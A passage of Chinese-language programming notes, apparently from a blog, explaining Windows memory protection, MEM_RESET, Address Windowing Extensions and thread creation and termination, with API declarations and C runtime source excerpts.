lpAddress是内存的基地址（用户分区）dwSize想要改变保护属性的大小，以字节为单位，flNewProtect 除了PAGE_WRITECOPY和PAGE_EXECUTE_WRITECOPY以外的任何PAGE_*保护属性。lpfOldProtect 返回原来的保护属性。必须传递一个有效的地址给lpfOldProtect，否则会调用失败。 保护属性是与整个物理存储页关联的，以下代码实际上是在给两个物理存储页指定保护属性PAGE_NOACCESS 12VirtualProtect(pvRgnBase + (3 * 1024), 2 * 1024, PAGE_NOACCESS, &amp;flOldProtect); 若干连续的物理存储页跨越了不同的区域时，VirtualProtect是不能改变他们的保护属性的。如果有相邻的区域，有想改变跨区域的连续页面的保护属性，需要调用VirtualProtect多次。 清楚物理存储器内容当修改物理存储页的时候，系统尽量把改动保持在内存中。但是，当应用程序在运行时候，系统可能要从exe文件，dll文件或者页交换文件中载入新的页面到内存。为了满足最近的载入请求，系统会在内存中查找可用的页面，如果找到的页面已经被修改过，那么系统还必须将它们换出到页面文件中。 windows提供了一项特性（重置物理存储器）告知系统一个或几个物理存储页中的数据没有被修改过。如果系统正在查找一页闲置内存，并找到了一个修改过的页面，那么系统必须把该内存页写入到页交换文件中。这个操作比较慢，会影响性能。对于大多数应用程序来说，我们都希望系统把修改后的页面保存到页交换文件中。 但是，有些应用程序只在一小段时间使用存储器，之后也不需要保留存储器中的内容。为了提高性能，应用程序可以告知系统不要在交换文件中保存指定的存储页。这是一种告知系统一个页面未被修改过的一种方法。如果系统要将一个内存页挪做他用，他不会将页面的内容保存到页交换文件中，这样就提高的了性能。为了重置存储器，应用程序调用VirtualAlloc函数，并在第三个参数传入MEM_RESET标志。 调用VirtualAlloc时，如果被引用到的页面在页交换文件中，那么系统会直接抛弃这些页面。下次应用程序再访问存储器，会使用新的，全部清零的内存页。如果重置的页面在内存中，系统会将其标记为未修改过。这样系统就绝不会把他们写到页交换文件中。（注意，即使该内存页没有被清零，我们也不应该继续读取其中的内容，因为系统随时可能会把该页挪做他用。因此一旦做了页重置，就应当将其视为无效数据） 还有一些注意事项：1）调用VirtualAlloc，基地址通常会被向下取整到页面大小的整数倍，而大小会被向下取整到页面大小的整数倍；在重置存储器时，这种方式对基地址进行取整是非常危险的；如果传入MEM_RESET那么VirtualAlloc会从相反的方向进行取整操作。 123456PINT pnData = (PINT)VirtualAlloc(NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); pnData[0] = 100; pnData[1] = 200; VirtualAlloc((PVOID)pnData, sizeof(int), MEM_RESET, PAGE_READWRITE); 该代码先调拨了一页存储器，然后告知系统最前4个字节（sizeof(4)）不再使用，可以被重置。事实上重置会调用失败。VirtualAlloc返回NULL，GetLastError返回ERROR_INVALID_ADDRESS因为在执行MEM_RESET的时候为了防止误操作把其他重要的数据抛弃。会把大小向下取整到0，而重置0字节是没有意义的。把大小向下取整到页面的整数倍也是出于同样的原因：如果垃圾数据并未占满整个页，那么我们并不希望重置整个页，因为其中可能还包含有效数据。这样系统就确保只会重置整个页面都是垃圾数据的内存页。 MEM_RESET只能单独使用，不能和其他标志进行按位或。 12PVOID pvMem = VirtualAlloc(NULL, 1024, MEM_RESERVE | MEM_COMMIT | MEM_RESET, PAGE_READWRITE); 该代码会失败并返回NULL 在使用MEM_RESET调用VirtualAlloc时，需要传递一个有效的保护属性值，实际上函数并没有用到这个值。 1）调用GlobalMemoryStatus获得机器中的内存总量2）调用VirtualAlloc函数来调拨存储器，调用的数量为第一步中得到的数量。这个操作非常快，除非进程去试图访问野蛮，否则系统是不会为页面分配内存的。如果VirtualAlloc在最新的机器上可能会返回NULL，这可能是因为机器中的内存总量比进程可用地址空间还要多（例如在装配了4GB以上内存的机器运行一个32位程序）3）调用ZeroMemory函数以访问刚才调拨的内存，这会给系统很大的压力。并导致原来在内存中的一些页面被写入到交换文件。 地址扩展窗口随着时间的推移，应用程序需要越来越多的内存。服务器程序尤其如此，将数据保存在内存中而减少磁盘和内存的页交换以提高性能。32位地址空间不大够用 Windows提供了一项特性，即地址窗口扩展（Address Windowing Extension，也称作AWE）在创建AWE以后，Microsoft有以下两个目标：1）允许应用程序以一种特殊的方式分配内存，操作系统保证不会将以这种方式分配的内存换出到磁盘上。2）允许应用程序访问比进程地址空间还要多的内存。 AWE可以让应用程序分配一块或多块内存。当一开始分配时，在进程的地址空间中是看不到这些内存块的。应用程序通过调用VirtualAlloc预定地址空间区域，这就是地址窗口。然后程序调用一个函数，每调用一个函数，就把一块内存指定到该地址窗口。（把内存地址指定到地址窗口是毫秒级别的） 使用地址窗口，一次只能访问一块内存。因此需要在代码中显式调用函数来把不同的内存块指定到地址窗口中。（这增加了代码编写的难度） 123456789101112131415161718192021222324252627282930313233343536373839// First, reserve a 1MB region for the address windowULONG_PTR ulRAMBytes = 1024 * 1024;PVOID pvWindow = VirtualAlloc(NULL, ulRAMBytes, MEM_RESERVE | MEM_PHYSICAL, PAGE_READWRITE);// Get the number of bytes in a page for this CPU platformSYSTEM_INFO sinf;GetSystemInfo(&amp;sinf);// Calculate the required number of RAM pages for the// desired number of bytesULONG_PTR ulRAMPages = (ulRAMBytes + sinf.dwPageSize - 1) / sinf.dwPageSize;// Allocate array for RAM page's page frame numbersULONG_PTR * aRAMPages = (ULONG_PTR *) new ULONG_PTR[ulRAMPages];// Allocate the pages of RAM (requires Lock Pages in Memory user right)AllocateUserPhysicalPages( GetCurrentProcess(), // Allocate the storage for our process &amp;ulRAMPages, // Input: # of RAM pages, Output: # pages allocated aRAMPages); // Output: Opaque array indicating pages allocated// Assign the RAM pages to our windowMapUserPhysicalPages( pvWindow, // The address of the address window ulRAMPages, // Number of entries in array aRAMPages); // Array of RAM pages// Access the RAM pages via the pvWindow virtual address// Free the block of RAM pagesFreeUserPhysicalPages( GetCurrentProcess(), // Free the RAM allocated for our process &amp;ulRAMPages, // Input: # of RAM pages, Output: # pages freed aRAMPages); // Input: Array indicating the RAM pages to free// Destroy the address windowVirtualFree(pvWindow, 0, MEM_RELEASE);delete[] aRAMPages; 程序通过调用VirtualAlloc函数来预定1MB的地址窗口（实际应用会更大，当然他受限制与进程地址空间中最大的，连续的闲置区域）MEM_RESERVE表示要预定一块地址区域。MEM_PHYSICAL标志表示该区域最终会以物理内存（RAM）作为后备（不使用物理页交换文件作为后备）。 AWE的一个限制是所有映射到地址窗口的存储器必须是可读可写 的。 因此页保护属性传递PAGE_READWRITE.不用使用VirtualProtect函数来改变页保护属性。 分配物理存储器调用一下函数： 123456789WINBASEAPI_Success_(return != FALSE)BOOLWINAPIAllocateUserPhysicalPages( _In_ HANDLE hProcess, _Inout_ PULONG_PTR NumberOfPages, _Out_writes_to_(*NumberOfPages, *NumberOfPages) PULONG_PTR PageArray ); 这个函数会根据NumberOfPages参数所指向的值来分配相应数量的的内存页，然后将这些页分配给hProcess参数所标识的进程。 操作系统会给每个页面指定一个页框号（page frame number）系统会将每个页面的页框号保存到PageArray所指向的数组。页框号本身对于应用程序来说没有什么用处。同时函数返回以后NumberOfPages的值表示成功分配的页面数量。通常这个值和传递值相同也可能会更小。 只有当前进程才能通过AllocateUserPhysicalPages分配得到内存页面，AWE不允许将内存页面映射到其他进程的地址空间中。（不能在进程中共享内存块） 当然，物理R A M是一种非常宝贵的资源，并且应用程序只能分配尚未指定用途的R A M。应该非常节省地使用 AW E，否则你的进程和其他进程将会过分地在内存与磁盘之间进行页面的交换，从而严重影响系统的运行性能。此外，如果可用 R A M的数量比较少，也会对系统创建新进程、线程和其他资源的能力产生不利的影响。应用程序可以使用G l o b a l M e m o r y S t a t u s E x函数来监控物理存储器的使用情况. 为了保护R A M的分配，A l l o c a t e U s e r P h y s i c a l P a g e s函数要求调用者拥有Lock Pagesin Memory（锁定内存中的页面）的用户权限，并且已经激活该权限，否则该函数的运行将会失败。按照默认设置，该权限不被赋予任何用户或用户组。该权限被赋予Local System（本地系统）帐户，它通常用于服务程序。如果想要运行一个调用A l l o c a t e U s e r P h y s i c a l P a g e s函数的交互式应用程序，那么管理员必须在你登录和运行应用程序之前为你赋予该权限。 接下来调用一下函数把内存块指定给地址窗口: 123456789WINBASEAPI_Success_(return != FALSE)BOOLWINAPIMapUserPhysicalPages( _In_ PVOID VirtualAddress, _In_ ULONG_PTR NumberOfPages, _In_reads_opt_(NumberOfPages) PULONG_PTR PageArray ); VirtualAddress是指定给地址窗口的虚拟地址。 NumberOfPages表示要通过这个地址窗口看到多少个页面的内存。 PageArray 表示通过该地址窗口看到哪些页面的内存。 如果地址窗口的大小小于我们试图映射的页面数，则会调用失败。一般该函数的执行时间是毫秒级别。 也可以调用M a p U s e r P h y s i c a l P a g e s函数来取消对当前R A M块的分配，方法是为a R A M P a g e s参数传递N U L L。下面是它的一个例子： 1ULONG_PTR ulRAMBytes = 1024 * 1024 一旦R A M块被分配给地址窗口，只需要引用相对于地址窗口的基地址（在我的示例代码中是p v Wi n d o w）的虚拟地址，就可以很容易地访问该R A M内存。 当不再需要R A M块时，应该调用F r e e U s e r P h y s i c a l P a g e s函数将它释放： 123456789WINBASEAPI_Success_(return != FALSE)BOOLWINAPIFreeUserPhysicalPages( _In_ HANDLE hProcess, _Inout_ PULONG_PTR NumberOfPages, _In_reads_(*NumberOfPages) PULONG_PTR PageArray ); hProcess表示要释放哪个进程的内存页。NumberOfPages表示要释放多少个页面PageArray表示要释放的页面框号。如果内存块已经被映射到窗口，那么系统会取消映射并释放内存块。 最后为了完成清理工作，程序调用VirtualFree并传入窗口的虚拟地址，以0位区域大小，并传入MEM_RELEASE标志。 这个例子创建了一个地址窗口和一个内存块。使得访问内存并不需要和磁盘进行页交换。应用程序也可以创建多个地址窗口，并分配多个内存块。并把内存块指定给任何一个地址窗口。但系统不允许一个内存块同时出现在两个地址窗口中。 AWE运行应用程序不会和磁盘进行页交换。","link":"/2019/09/04/Windows-Kernel-15/"},{"title":"Windows-Kernel-6","text":"线程线程由两部分组成： 一个是线程的内核对象，操作系统用它来对线程实施管理。内核对象也是系统用来存放线程统计信息的地方。 另一个是线程堆栈，它用于维护线程在执行代码时需要的所有函数参数和局部变量。 进程不执行任何东西。进程只是一个线程容器，进程内的线程共享地址空间、进程的内核对象句柄。 进程需要维护地址空间，加载dll ，exe文件等。操作系统内部需要统计大量的信息。 而线程只需要一个内核对象和一个栈，开销低很多。（在VC++库上还会维护一个_tiddata的Thread Local Storage的数据结构） 何时创建线程线程用于描述进程中的运行路径。每当进程被初始化，系统就要创建一个主线程。该线程与C/C++运行期库的启动代码一道开始执行，启动代码则调用进入点函数(main、wmain、WinMain或wWinMain)，并且继续运行直到进入点函数返回并且C/C++运行凄苦的启动调用调用ExitProcess为止。 充分利用cpu资源并行执行任务。将UI和后台处理分割，UI只响应用户输入，处理交给后台的线程。这样能提升用户体验。 何时不能创建线程线程能解决一些问题但是会产生一些新的问题。也就是数据共享问题。（多线程同时访问数据该如何同步防止产生资源竞争） 在用户界面上应该用一个线程来创建各个层级的窗口（很少用多线程创建各自的窗口，Windows的Explorer资源管理器的每个窗口都是一个线程为了防止某个文件操作停止响应而导致完全无法操作管理文件） 通常应用程序由一个用户界面线程处理消息和创建各种窗口（高优先级），其他工作线程处理各种后台运算并且不会创建窗口。 编写第一个线程函数每个线程必须拥有一个进入点函数，线程从这个进入点开始运行。 123456DWORD WINAPI ThreadFunc(PVOID pvParam) { DWORD dwResult = 0; //... return dwResult;} 线程内核对象的寿命可能超过线程本身的寿命。 线程函数的问题说明： 主线程的进入点函数必须是main、wmain、WinMain、wWinMain，与这些函数不同的是，线程函数可以使用任何名字。 可以给线程函数传递单个参数，参数的含义由你而不是由操作系统来定义。 线程函数必须返回一个值，它将成为该线程的退出代码（主线程的退出代码成为进程的退出代码） 线程函数（实际上是你的所有函数）应该尽可能使用函数参数和局部变量。当使用静态变量和全局变量时，多个线程可以同时访问这些变量，这可能破坏变量的内容。 CreateThread函数如果需要创建一个或多个辅助函数，只需让一个已经在运行的线程来调用CreateThread： 123456789101112WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateThread( _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId ); 该函数会创建一个线程内核对象，一个较小的数据结构，操作系统用该结构来管理线程。 系统从进程的地址空间中分配内存给线程栈使用。 新线程可以访问进程内核对象的所有句柄，进程中所有内存以及同一个进程中其他所有线程的栈。 在写C/C++代码的时候不要使用CreateThread来创建线程，而应该用C++库的_beginthreadex. CreateThread提供操作系统级别的创建线程的操作，且仅限于工作者线程。不调用MFC和RTL的函数时，可以用CreateThread，其它情况不要轻易。在使用的过程中要考虑到进程的同步与互斥的关系（防止死锁）。线程函数定义为：DWORD WINAPI _yourThreadFun(LPVOID pParameter)。 但它没有考虑： C Runtime中需要对多线程进行纪录和初始化，以保证C函数库工作正常（典型的例子是strtok函数）。 MFC也需要知道新线程的创建，也需要做一些初始化工作（当然，如果没用MFC就没事了）。同时_beginthreadex呢：MS对C Runtime库的扩展SDK函数，首先针对C Runtime库做了一些初始化的工作，以保证C Runtime库工作正常。然后，调用CreateThread真正创建线程。 仅使用Runtime Library时，可以用_BegingThreadex。 在_beginthreadex的源码中（后面有贴）。可以看出最重要的一个步骤是调用 _calloc_crt来创建一个线程特有的数据结构和线程私有的数据结构（thread local storage）_tiddata, 比如多线程的strok等。 总结：如果你要在自己创建的线程函数中使用大量C/C++标准库的功能就必须使用_beginthreadex防止出错 如果只是单纯的使用windows api 不涉及任何标志C/C++库函数可以调用CreateThread psapsa参数是指向SECURITY_ATTRIBUTES结构的指针，如果想要该线程内核对象的默认安全属性，可以传递NULL。如果希望所有的紫禁城都能够继承该线程的句柄，必须设定一个SECURITY_ATTRIBUTES结构，它的bInheritHandle成员被初始化为TRUE。 cbStack指定线程可以为其线程栈使用多少地址空间。 CreateProcess创建主线程也会使用此值，保存在exe文件内部。 可以用/STACK:[reserve] [,commit]来控制该值。 默认是1MB（在Itanium芯片组上默认4MB） commit 指定最初应该为栈预留的地址空间区域调拨多少物理内存，默认是一个页。 预定的地址空间的容量设定了栈空间的上限，这样才能捕获代码中的无穷递归bug（默认x86 CPU的 ESS, ESP寄存器本身并不设定任何栈空间的上限，这是操作系统为了管理栈所做的限制）也防止线程耗尽进程的内存地址空间。 pfnStartAddr和pvParam指定了线程函数的地址， 线程函数的参数与CreateThread的pvParam参数一致。通常用于传递一个初始值给线程函数。这样多个线程可以共用同一个线程函数。通过向其传递不同的初始值来指定不同的任务。 Windows是个抢占式多线程系统，这意味着新线程和调用CreateThread的线程可以同时执行。由于线程可以同时运行，就会出现问题，参考一下错误代码： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD WINAPI SecondThread(PVOID pvParam) { // Do some length processing here... // attempt to access the variable on FirstThread's stack. // Note:: this may cause an access violation - it depends on timing!. *((int *)pvParam) = 5; return 0;}DWORD WINAPI FirstThread(PVOID pvParam) { // Initialize a stack-based variable int x = 0; DWORD dwThreadID; // Create a new thread. HANDLE hThread = CreateThread(NULL, 0, SecondThread, (PVOID)&amp;x, 0, &amp;dwThreadID); // we don't reference the new thread anymore. // so close our handle to it. CloseHandle(hThread); // Our thread is done. // Bug: our stack will be destroyed, but // Secondthread might try to access it. return 0;} 该问题的解决方案是将x申明为一个静态变量，使编译器在应用程序的Section（而不是线程栈）中为x创建一个存储区域。 但是这又会使得当前线程不可重入。（也就是不能再创建同一个线程来执行当前函数）除非使用正确的线程同步技术。 fdwCreatefdwCreate参数可以设定用于控制创建线程的其他标志。它可以是两个值中的一个。如果该值为0，那么线程创建后可以立即恢复调度。如果改质是CREATE_SUSPENDED，系统可以完成的创建线程并对它初始化，但是如果要暂停该线程，这样它就无法进行调度。 pdwThreadID一个指向DWORD型的地址，返回创建线程的ThreadID。 线程的终止若要终止线程的运行，可以使用以下的方法： 线程函数返回（做好使用这种方法） 通过调用ExitThread函数，线程将自行撤销（最好不要使用这种方法） 同一个进程或另一个进程中的线程调用TerminateThread函数（应该避免使用） 包含线程的进程终止运行（应该避免使用） 线程函数返回让线程函数返回，可以确保以下正确的应用程序清理工作都得以执行。 线程函数中创建的所有C++对象都通过其析构函数被正确销毁。 操作系统正确释放线程栈使用的内存 操作系统把线程的退出代码设置为线程函数的返回值 系统递减少线程内核对象的使用计数器。 ExitThread函数1234567WINBASEAPIDECLSPEC_NORETURNVOIDWINAPIExitThread( _In_ DWORD dwExitCode ); 该函数将终止线程的运行，并且导致操作系统清理该线程所使用的所有操作系统资源。但是标准C/C++库内部维护的资源不会被销毁（通常是_tiddata数据结构和SEH帧）因此最好是直接让线程函数返回，而不要调用ExitThread。 如果一定要杀死C++线程要用_endthreadex (因为他能正常销毁标准库的c++对象：通常是_tiddata数据结构和SEH帧) TerminateThread函数1234567WINBASEAPIBOOLWINAPITerminateThread( _In_ HANDLE hThread, _In_ DWORD dwExitCode ); ExitThread用于杀死主调线程，TerminateThread能杀死任何线程。hThread表示了那个要被杀死线程的句柄。此函数是异步的，通知杀死目标线程后立即返回。需要调用WaitForSingleObject来确定目标线程是否已经被杀死。 但一个良好设计的应用程序绝不应该使用这个函数，因为被函数杀死的线程收不到他被杀死的通知。线程无法正确清理，而且不能阻止自己被终止运行。 注意ExitThread来终止线程是可以销毁堆栈的。 但TerminateThread，除非该线程的进程终止运行，否则其线程堆栈不会被释放。（这是微软故意设计的，否则如果有其他线程还在引用那个被杀死的线程堆栈上的数据，就会引起访问违规。） 另外DLL库在线程ExitThread时候会收到通知，但TerminateThread则不会收到通知。 看一下如下的测试代码。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;class a{public: a(){ int temp; temp = 0; } ~a(){ int temp; temp = 0; }};DWORD WINAPI SecondThread(PVOID pvParam) { a A; while (true) { } return 0;}int _tmain(int argc, TCHAR* argv[], TCHAR * env[]){ DWORD dwThreadID; HANDLE hThread = CreateThread(NULL, 0, SecondThread, NULL, 0, &amp;dwThreadID); Sleep(1000); TerminateThread(hThread, 0); CloseHandle(hThread); while (true) { } return 0;} 在主线程中创建了子线程SecondThread， 在SecondThread的栈上创建了对象A。实际调试发现。 A的析构函数永远不会被调用。因为TerminateThread不会销毁目标线程的栈。 进程终止运行时ExitProcess和TerminateProces也可以用于终止线程的运行。该函数会使终止的进程中的所有线程都终止，由于整个进程都会被关闭，所以线程的所有资源肯定会被清理。 线程终止运行时发生的操作当线程终止运行的时候，会发生下列操作： 线程用户的所有用户对象均被释放。在Windows中，大多数对象是由包含创建这些对象的线程的进程拥有的。一个线程至少拥有两个对象：窗口和钩子归线程所有。 线程的退出代码从STILL_ACTIVE编程传递给ExitThread和TerminateThread的值 线程内核对象的状态变为已通知 如果线程是进程中最后一个活动线程，系统也将进程视为已经终止运行 线程内核对象的使用计数递减1 当一个线程终止运行时，在与它相关联的线程内核对象的所有未结束的引用关闭之前，该内核对象不会自动被释放 可以调用GetExitCodeThread 来检测hThread所表示的线程是否已经终止并检查其退出代码。 12345678WINBASEAPI_Success_(return != 0)BOOLWINAPIGetExitCodeThread( _In_ HANDLE hThread, _Out_ LPDWORD lpExitCode ); 退出代码的值在pdwExitProcess指向的DOWRD中返回。 如果调用GetExitCodeThread时线程尚未终止运行，该函数就用 STILI_ACTLIVE标识符（定义为0 x 1 0 3）填入DWORD。 线程的一些性质 调用CreateThread可使系统创建一个线程内核对象。该对象的使用技术是2（在线程停止运行和从CreateThread返回的句柄关闭之前，线程内核对象不会撤销。 一旦创建了线程内核对象，系统就分配内存，供线程的堆栈使用。（内存是进程的地址空间内分配的）在其堆栈上写入两个值（从高位到地位：pvParam参数值 和pfnStartAddr线程函数入口地址） 每个线程都有一组与之对应的寄存器值。存放于CONTEXT结构体定义在Winnt.h中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687typedef struct _CONTEXT { // // The flags values within this flag control the contents of // a CONTEXT record. // // If the context record is used as an input parameter, then // for each portion of the context record controlled by a flag // whose value is set, it is assumed that that portion of the // context record contains valid context. If the context record // is being used to modify a threads context, then only that // portion of the threads context will be modified. // // If the context record is used as an IN OUT parameter to capture // the context of a thread, then only those portions of the thread's // context corresponding to set flags will be returned. // // The context record is never used as an OUT only parameter. // DWORD ContextFlags; // // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is // set in ContextFlags. Note that CONTEXT_DEBUG_REGISTERS is NOT // included in CONTEXT_FULL. // DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_FLOATING_POINT. // FLOATING_SAVE_AREA FloatSave; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_SEGMENTS. // DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_INTEGER. // DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_CONTROL. // DWORD Ebp; DWORD Eip; DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; // // This section is specified/returned if the ContextFlags word // contains the flag CONTEXT_EXTENDED_REGISTERS. // The format and contexts are processor specific // BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION]; } CONTEXT; typedef CONTEXT *PCONTEXT; 该 CONTEXT 数据结构存放于线程内核对象中 CONTEXT中的Esp和SegSs指向了ptnStartAddr在线程堆栈中的地址。（ESP:SS） CONTEXT中的Eip和SegCs指向RtlUserThreadStart函数（ntdll.dll）导出 123456789101112void RtlUserThreadStart(PTHREAD_START_ROUTINE pfnStartAddr, PVOID pvParam){ _try { ExitThread((pfnStartAddr)(pvParam)); } _except(UnhandledExceptionFilter(GetExceptionInfomation())) { ExitProcess(GetExceptionCode()); } // NOTE: we never get here!} 线程完全创建好以后，系统将检查CREATE_SUSPENDED标志是否已被传递给CreateThread函数。如果没有，系统将线程挂机计数递减到0；随后线程就可以调度给cpu去执行。cpu在轮询执行线程以前先加载CONTEX中的每个寄存器的值，因为CS:IP指向了RtlUserThreadStart 所以该函数是线程开始执行的地方。（两个参数是操作系统显示写入线程堆栈传递的） 新线程执行RtlUserThreadStart函数将发生以下事情: 在线程函数中建立一个结构体异常处理（SEH）帧，这样，在线程执行时产生的任何异常情况都会得到系统的某种默认处理。 系统调用线程函数，并将你传递给CreateThread函数的pvParam函数传递给它 当线程函数返回时，BaseThreadStart调用ExitThread，并将线程函数返回值传递给它。该线程内核对象的使用计数递减，线程停止执行。 如果线程产生一个未被处理的异常，RtlUserThreadStart函数所设置的SEH帧会处理这个异常。通常是显示一个框，在用户关闭以后RtlUserThreadStart会调用ExitProcess来终止进程。 线程函数在完成他的工作以后返回并将线程函数的返回值压入堆栈，是线程函数直到在何处返回。 但是RtlUserThreadStart函数是不允许返回的。如果他在没有强行杀死线程的情况下返回，几乎肯定会引起访问违规，因为线程堆栈上没有函数返回地址。 同样进程的主线程初始化时，其CONTEXT中的CS:IP也被设定为RtlUserThreadStart。 他会调用c/c++中的启动代码。后者再调用mian WinMain函数。 在main函数返回以后C/C++的启动代码再调用ExitProcess。 主线程永远都不会返回RtlUserThreadStart函数 C/C++运行期库的考虑VC++配有6个C/C++运行期库： 例如在早期标准C库中多个线程同时会访问一个全局变量，errno。对其访问的值未必是当前线程执行了系统函数的正确反映值。（该值不具备Thread Local Storage特性） 还有_doserrno, strtok, _wcstok, strerror, _strerror, tmpnam, tmpfile, asctime, _wasctime, gmtime,_ecvt 和 _fcvt等。 因此有了_beginthreadex函数，该函数内部调用的CRT library会维护（TLS）变量和函数的初始化工作。 12345678_CRTIMP uintptr_t __cdecl _beginthreadex ( void *security, unsigned stacksize, unsigned (__stdcall * initialcode) (void *), void * argument, unsigned createflag, unsigned *thrdaddr ); 因为微软的C/C++团队认为C++运行库函数不应该对操作系统数据类型有任何依赖。宏chBEGINTHREADEX可以直接替换CreateThread执行_beginthreadex 参考_beginthreadex的代码实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788_CRTIMP uintptr_t __cdecl _beginthreadex ( void *security, unsigned stacksize, unsigned (__stdcall * initialcode) (void *), void * argument, unsigned createflag, unsigned *thrdaddr ){ _ptiddata ptd; /* pointer to per-thread data */ uintptr_t thdl; /* thread handle */ unsigned long err = 0L; /* Return from GetLastError() */ unsigned dummyid; /* dummy returned thread ID */ /* validation section */ _VALIDATE_RETURN(initialcode != NULL, EINVAL, 0); /* * Allocate and initialize a per-thread data structure for the to- * be-created thread. */ if ( (ptd = (_ptiddata)_calloc_crt(1, sizeof(struct _tiddata))) == NULL ) goto error_return; /* * Initialize the per-thread data */ _initptd(ptd, _getptd()-&gt;ptlocinfo); ptd-&gt;_initaddr = (void *) initialcode; ptd-&gt;_initarg = argument; ptd-&gt;_thandle = (uintptr_t)(-1); #if defined (_M_CEE) || defined (MRTDLL) if(!_getdomain(&amp;(ptd-&gt;__initDomain))) { goto error_return; }#endif /* defined (_M_CEE) || defined (MRTDLL) */ /* * Make sure non-NULL thrdaddr is passed to CreateThread */ if ( thrdaddr == NULL ) thrdaddr = &amp;dummyid; /* * Create the new thread using the parameters supplied by the caller. */ if ( (thdl = (uintptr_t) _createThread( (LPSECURITY_ATTRIBUTES)security, stacksize, (LPVOID)ptd, createflag, (LPDWORD)thrdaddr)) == (uintptr_t)0 ) { err = GetLastError(); goto error_return; } /* * Good return */ return(thdl); /* * Error return */error_return: /* * Either ptd is NULL, or it points to the no-longer-necessary block * calloc-ed for the _tiddata struct which should now be freed up. */ _free_crt(ptd); /* * Map the error, if necessary. * * Note: this routine returns 0 for failure, just like the Win32 * API CreateThread, but _beginthread() returns -1 for failure. */ if ( err != 0L ) _dosmaperr(err); return( (uintptr_t)0 );} 要点： 每个线程都有自己的_tiddata内存块，是从c/c++运行库的堆上分配的。 传递_beginthreadex 的线程函数地址保存在_tiddaa内存块中(保存了一些线程相关的统计信息）。 在_beginthreadex内部传递给CreateThread的函数地址是_threadstartex而非_pfnStartAddr,参数是_tiddata结构的地址。 （但是实际上_ptfnStartAddr 和pvParam都已经被保存在_tiddata结构体内部了） _threadstartex函数实现： 1234567891011121314151617181920212223242526static unsigned long WINAPI _threadstartex ( void * ptd ){ _ptiddata _ptd; /* pointer to per-thread data */ /* * Check if ptd is initialised during THREAD_ATTACH call to dll mains */ if ( ( _ptd = (_ptiddata)__crtFlsGetValue(__get_flsindex())) == NULL) { /* * Stash the pointer to the per-thread data stucture in TLS */ if ( !__crtFlsSetValue(__get_flsindex(), ptd) ) ExitThread(GetLastError()); /* * Set the thread ID field -- parent thread cannot set it after * CreateThread() returns since the child thread might have run * to completion and already freed its per-thread data block! */ ((_ptiddata) ptd)-&gt;_tid = GetCurrentThreadId(); _ptd = ptd; } //...} 接着该函数会调用_callthreadex函数来启动线程 1234567891011121314151617181920212223242526static void _callthreadstartex(void){ _ptiddata ptd; /* pointer to thread's _tiddata struct */ /* must always exist at this point */ ptd = _getptd(); /* * Guard call to user code with a _try - _except statement to * implement runtime errors and signal support */ __try { _endthreadex ( ( (unsigned (__CLR_OR_STD_CALL *)(void *))(((_ptiddata)ptd)-&gt;_initaddr) ) ( ((_ptiddata)ptd)-&gt;_initarg ) ) ; } __except ( _XcptFilter(GetExceptionCode(), GetExceptionInformation()) ) { /* * Should never reach here */ _exit( GetExceptionCode() ); } /* end of _try - _except */ } 可以看到该函数的原型很像RtlUserThreadStart关于_threadstartex有几个重点 新线程首先执行RtlUserThreadStart然后再跳转到_threadstartex _threadstartex唯一的参数就是线程的_tiddata的内存块地址 TlsSetValue是一个操作系统函数，他将一个值和主调线程关联。（TLS） 这里 _threadstartex和_tiddata内存块关联。在 _callthreadstartex有一个SEH帧它将预期要执行的线程函数包围起来。这个帧处理这与运行库相关的许多事（异常，signal函数）调用预期被执行的线程函数 123_endthreadex ( ( (unsigned (__CLR_OR_STD_CALL *)(void *))(((_ptiddata)ptd)-&gt;_initaddr) ) ( ((_ptiddata)ptd)-&gt;_initarg ) ) ; 线程函数的返回值被认为是线程的退出代码。 123456789101112131415161718192021222324252627void __cdecl _endthreadex ( unsigned retcode ){ _ptiddata ptd; /* pointer to thread's _tiddata struct */ HANDLE handle = NULL; ptd = _getptd_noexit(); if (ptd) { if (ptd-&gt;_initapartment) _uninitMTAoncurrentthread(); /* * Free up the _tiddata structure &amp; its subordinate buffers * _freeptd() will also clear the value for this thread * of the FLS variable __flsindex. */ _freeptd(ptd); } /* * Terminate the thread */ ExitThread(retcode); } 关于_endthreadex函数的要点: _getptd_noexit在内部调用TlsGetValue获得主调线程的tiddata内存块地址。 _endthreadex将此数据块释放。并调用操作系统的ExitThread函数实际销毁。 接下来所有C++运行库中需要与线程相关的函数都可以通过TlsGetValue来获得与其相关的线程数据_tiddata进行相关的处理。 errno全局变量是如何实现TLS呢？ errno在标准库被定义为一个宏 实际是调用一个_errno()的函数 123456789101112131415_CRTIMP extern int * __cdecl _errno(void);#define errno (*_errno()) int * __cdecl _errno( void ){ _ptiddata ptd = _getptd_noexit(); if (!ptd) { return &amp;ErrnoNoMem; } else { return ( &amp;ptd-&gt;_terrno ); } } 注意一个细节 _errno()函数返回一个指向内部pdt-&gt;_terno的值的指针。然后调用取值符号最后写成 (*_errno())这样写是很有必要的。 因为在实际代码中可能会这样使用errno 